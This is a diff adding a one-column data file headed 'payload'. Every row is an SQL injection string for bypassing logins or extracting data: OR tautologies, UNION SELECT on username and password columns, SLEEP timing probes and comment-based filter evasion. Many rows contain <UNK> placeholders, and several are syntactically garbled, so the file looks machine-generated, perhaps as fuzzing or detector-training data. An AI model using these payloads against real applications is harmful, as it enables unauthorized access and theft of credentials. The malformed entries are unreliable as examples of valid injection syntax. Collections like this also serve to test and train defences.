@@ -1,0 +1,95 @@
+payload
+admin'/**/Or/**/'%admin%
+admin'Or'2'='1
+admin'oR'x'='x'#
+admin'Or'a'='a';--
+admin'Or'x'='a'#
+admin'oR'a'='a'--
+admin'AnD'1'='1'/*
+admin'Or 1=1--
+admin'Or'a'='a'LIMIT 1--
+admin'/**/uNIoN SELeCt sELEct--
+admin'UNIOn bY columnnames having 0x31='a'--
+admin'Or 1=1;--
+admin'AnD;--
+admin'/**/%20OR%201=1
+admin'Or'x'='x'
+admin'Or SLEep(2 + 3)AND'1'='1
+admin'Or'y'2'='a'--
+admin'OR'a'='a
+admin'oR'y'='x'--
+admin'Or exIsTs(6 - 1)--
+admin'%20aND%20oR%20'1'='1
+admin'Or'2'='1'#
+admin'Or'1'='1
+admin'Or'a'='a
+admin'oR'x'='x'--
+<UNK> OR SLeEp(2 + 3)AND'1'='1
+"<UNK>;,password fROM And--"
+<UNK>'%20/**/'%aDMiN%
+<UNK> OR'a'='a
+<UNK> OR'a'='a'--
+<UNK> AnD 1 <=1--
+<UNK> OR'x'='x'#
+"<UNK> oR bY(username,/**/1,0x1)='a"
+"<UNK> AND 1=CONVERT(int,(1)--"
+<UNK>'y'='x'/*
+<UNK> 1 <=1;--
+<UNK>'/**//**/%20AND%20'1'='1
+"<UNK> AnD username SelECt username,password/**/aLl--"
+"<UNK> Or ExiSts(username,1,/**/ORDER,0x1--"
+"<UNK>'/**/username*/UNIoN/**/username,password/**/frOm/**/--"
+<UNK>'Or'1'='1
+<UNK> Or'a'='a'--
+<UNK> OR'2'='y'#
+<UNK> Or username Like'%admin%
+<UNK> Admin/**/='a'--
+"<UNK> OR EXISTS(SELECT SELEct,password FrOM uSErs)--"
+<UNK> OR 2 > 1
+<UNK> Or 2 > 1--
+<UNK>'Or'1'='2
+--'oR'1'='1
+--'oR'x'='#
+--'/**//**//**//**/UnION/**/USeRs--
+--'Or'1'='1
+--'Or'1'='1'LIMIT 1--
+--'/**/%20OR%
+"--'/**/SElEcT/**/SELECT/**/username,/**/UniON,Null--"
+--'%20anD%20'1'='2
+--'Or 1=1--
+--'/**/AND/**/'x'='a
+--'Or'1'='2
+--OR 1 <=1#
+--'Or'2'='x'--
+--'Or'1'='1'/*
+--'AnD'1'='1
+--/**/'%20AND%admin%
+--'Or'1'='1'--
+--'Or'x'='x'
+--'/**//**/AND/**/'1'='1
+--'Or'2'='1'/*
+--'%20aND%20'1'='1
+--'/**/UnioN/**/'1'='1
+<UNK> OR 3 >=3;--
+<UNK> OR'a'='a'/*
+<UNK> OR 1=1;--
+<UNK>/**/UNION/**/USers/**/anD'1'='2
+<UNK>'oR'x'='2
+<UNK> oR'a'='a'#
+<UNK>'uNIon AlL 31=0x31--
+<UNK>'Or'x'='x'
+<UNK> OR'x'='x'--
+"<UNK> Or 1=CONVERT(int,(SeLeCt @ @ version))--"
+<UNK>/**/OR 1=2 - 1--
+<UNK> Or 1=1--
+<UNK> Or exISts(2 + 3)--
+<UNK> OR 1=1
+<UNK> OR 0x31=0x31#
+<UNK>;SeLecT dRop @ version))--
+<UNK> OR'x'='x'/*
+<UNK> aNd/**/NuLl/**/'a'='a
+<UNK> OR'a'='a'#
+<UNK>'/**/And/**/'1'='2
+<UNK> OR 1=1 LIMIT 1--
+"<UNK>;/**/SElEcT/**/AnD,username,password FroM nuLl"
+<UNK> SlEep'a'='a'--
